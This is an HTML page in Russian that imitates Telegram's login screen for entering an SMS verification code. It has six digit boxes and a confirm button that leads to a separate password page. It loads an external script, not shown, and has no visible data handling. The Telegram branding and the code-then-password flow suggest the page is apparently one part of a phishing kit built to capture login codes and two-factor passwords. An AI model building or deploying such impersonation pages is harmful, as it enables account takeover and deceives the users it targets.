<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram — ввод кода</title>
    <style>
        /* ========== СТИЛИ CSS ========== */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background-color: #f0f2f5;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 16px;
            color: #1c1e21;
        }

        .tg-card {
            max-width: 400px;
            width: 100%;
            background-color: #ffffff;
            border-radius: 16px;
            box-shadow: 0 4px 18px rgba(0, 0, 0, 0.08), 0 2px 6px rgba(0, 0, 0, 0.02);
            padding: 32px 24px 28px;
        }

        .tg-header h1 {
            font-size: 28px;
            font-weight: 600;
            line-height: 1.2;
            color: #0a0a0a;
            letter-spacing: -0.2px;
            margin-bottom: 12px;
        }

        .tg-header .phone-hint {
            font-size: 15px;
            color: #6c757d;
            font-weight: 400;
            margin-bottom: 32px;
            line-height: 1.4;
        }

        /* Контейнер для 6 квадратиков */
        .code-container {
            display: flex;
            gap: 10px;
            justify-content: space-between;
            margin-bottom: 32px;
        }

        .code-digit {
            width: 52px;
            height: 56px;
            background-color: #f8f9fa;
            border: 1.5px solid #e9ecef;
            border-radius: 14px;
            font-size: 28px;
            font-weight: 500;
            text-align: center;
            line-height: 56px;
            color: #1a1a1a;
            box-shadow: inset 0 2px 4px rgba(0,0,0,0.02);
            transition: border 0.15s;
            font-family: 'Courier New', monospace;
        }

        /* Эффект фокуса для активного квадратика */
        .code-digit.filled {
            border-color: #2f8dbb;
            background-color: #ffffff;
            box-shadow: 0 0 0 3px rgba(47, 141, 187, 0.1);
        }

        /* Кнопка отправки */
        .submit-btn {
            background-color: #2f8dbb;
            color: white;
            border: none;
            border-radius: 12px;
            padding: 16px 20px;
            font-size: 18px;
            font-weight: 600;
            width: 100%;
            text-align: center;
            cursor: pointer;
            letter-spacing: 0.3px;
            box-shadow: 0 2px 8px rgba(47, 141, 187, 0.2);
            margin-bottom: 20px;
            transition: background-color 0.2s;
        }

        .submit-btn:hover {
            background-color: #2679a3;
        }

        .submit-btn:active {
            background-color: #1f6385;
        }

        /* Ссылка для повторной отправки */
        .resend-link {
            text-align: center;
            font-size: 15px;
            color: #6c757d;
            margin-top: 8px;
        }

        .resend-link a {
            color: #2f8dbb;
            text-decoration: none;
            font-weight: 500;
        }

        hr {
            border: none;
            border-top: 1px solid #eef2f5;
            margin: 20px 0 14px;
        }

        .back-link {
            text-align: center;
            font-size: 15px;
        }

        .back-link a {
            color: #8e98a3;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="tg-card">
        <div class="tg-header">
            <h1>Введите код</h1>
            <div class="phone-hint">
                Мы отправили SMS с кодом проверки на Ваш телефон.
            </div>
        </div>

        <!-- 6 квадратиков для ввода кода -->
        <div class="code-container" id="codeContainer">
            <div class="code-digit" id="digit0"></div>
            <div class="code-digit" id="digit1"></div>
            <div class="code-digit" id="digit2"></div>
            <div class="code-digit" id="digit3"></div>
            <div class="code-digit" id="digit4"></div>
            <div class="code-digit" id="digit5"></div>
        </div><br><br><br><br><br>

        <!-- Кнопка для отправки кода -->
        <a href="password.html"><button class="submit-btn" id="submitBtn">ПОДТВЕРДИТЬ</button></a>

        <!-- Ссылка для повторной отправки -->
        <div class="resend-link">
            Не получили код? <a href="#" id="resendLink">Отправить снова</a>
        </div>

        <hr>

        <div class="back-link">
            <a href="index.html" id="backLink">← Назад</a>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
